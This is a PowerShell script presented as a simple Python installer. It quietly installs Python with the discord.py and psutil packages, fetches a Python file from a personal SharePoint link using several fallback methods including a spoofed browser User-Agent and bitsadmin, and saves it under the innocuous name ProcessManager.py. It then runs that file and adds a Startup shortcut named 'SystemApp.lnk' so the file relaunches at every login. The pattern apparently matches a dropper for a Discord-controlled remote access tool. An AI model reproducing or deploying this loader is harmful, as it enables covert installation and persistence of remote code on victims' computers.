# Simple Python and Script Installer - Universal Windows 10/11
Write-Host "Starting setup..." -ForegroundColor Cyan

# Check Python
try {
    $null = cmd /c "python --version" 2>$null
    if ($LASTEXITCODE -eq 0) {
        Write-Host "Python is installed" -ForegroundColor Green
        $pythonInstalled = $true
    } else {
        $pythonInstalled = $false
    }
} catch {
    $pythonInstalled = $false
}

# Install Python if needed
if (-not $pythonInstalled) {
    Write-Host "Installing Python..." -ForegroundColor Yellow
    
    # Download Python with multiple methods
    $pythonUrl = "https://www.python.org/ftp/python/3.10.11/python-3.10.11-amd64.exe"
    $installerPath = "$env:TEMP\python_install.exe"
    
    # Method 1: Basic WebClient
    try {
        (New-Object System.Net.WebClient).DownloadFile($pythonUrl, $installerPath)
    } catch {
        # Method 2: BITS Transfer
        try {
            Start-BitsTransfer -Source $pythonUrl -Destination $installerPath
        } catch {
            Write-Host "Python download failed" -ForegroundColor Red
            exit 1
        }
    }
    
    # Install Python
    Start-Process -FilePath $installerPath -ArgumentList @(
        "/quiet",
        "InstallAllUsers=0", 
        "PrependPath=1",
        "Include_test=0",
        "Include_pip=1",
        "Include_launcher=0"
    ) -Wait
    
    Start-Sleep -Seconds 10
    Write-Host "Python installed" -ForegroundColor Green
}

# Install packages
Write-Host "Installing packages..." -ForegroundColor Yellow
Start-Process -FilePath "python" -ArgumentList "-m", "pip", "install", "discord.py", "psutil", "--user", "--quiet" -Wait

# Download the script with special headers for SharePoint
Write-Host "Downloading application..." -ForegroundColor Yellow
$scriptUrl = "https://trioworldacademy1-my.sharepoint.com/:u:/g/personal/namanreddykaliki_trioworldacademy_com/ET8GO_7FfCdImpWbGYD-zREB9WkwjG6K5Zoo9dn0xghp9g?e=UT9Chy&download=1"
$scriptPath = "$env:USERPROFILE\ProcessManager.py"

# Method 1: WebClient with headers
try {
    $webClient = New-Object System.Net.WebClient
    $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
    $webClient.DownloadFile($scriptUrl, $scriptPath)
    Write-Host "Application downloaded" -ForegroundColor Green
} catch {
    # Method 2: Invoke-WebRequest with basic parsing
    try {
        Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath -UseBasicParsing
        Write-Host "Application downloaded" -ForegroundColor Green
    } catch {
        # Method 3: Use bitsadmin (Windows built-in)
        try {
            $tempScript = "$env:TEMP\temp_script.py"
            cmd /c "bitsadmin /transfer mydownload /download /priority normal `"$scriptUrl`" `"$tempScript`""
            if (Test-Path $tempScript) {
                Move-Item -Path $tempScript -Destination $scriptPath -Force
                Write-Host "Application downloaded" -ForegroundColor Green
            } else {
                Write-Host "Download failed - cannot continue" -ForegroundColor Red
                exit 1
            }
        } catch {
            Write-Host "All download methods failed" -ForegroundColor Red
            exit 1
        }
    }
}

# Verify download
if (Test-Path $scriptPath) {
    Write-Host "Starting application..." -ForegroundColor Green
    Start-Process -FilePath "python" -ArgumentList "`"$scriptPath`""
} else {
    Write-Host "Application file not found" -ForegroundColor Red
    exit 1
}

# Add to startup
Write-Host "Setting up startup..." -ForegroundColor Yellow
try {
    $startupPath = [Environment]::GetFolderPath("Startup")
    $shell = New-Object -ComObject WScript.Shell
    $shortcut = $shell.CreateShortcut("$startupPath\SystemApp.lnk")
    $shortcut.TargetPath = "python"
    $shortcut.Arguments = "`"$scriptPath`""
    $shortcut.WorkingDirectory = "$env:USERPROFILE"
    $shortcut.Save()
    Write-Host "Startup configured" -ForegroundColor Green
} catch {
    Write-Host "Startup setup failed" -ForegroundColor Yellow
}

Write-Host "Setup completed!" -ForegroundColor Green
Write-Host "Closing in 3 seconds..." -ForegroundColor Yellow
Start-Sleep -Seconds 3
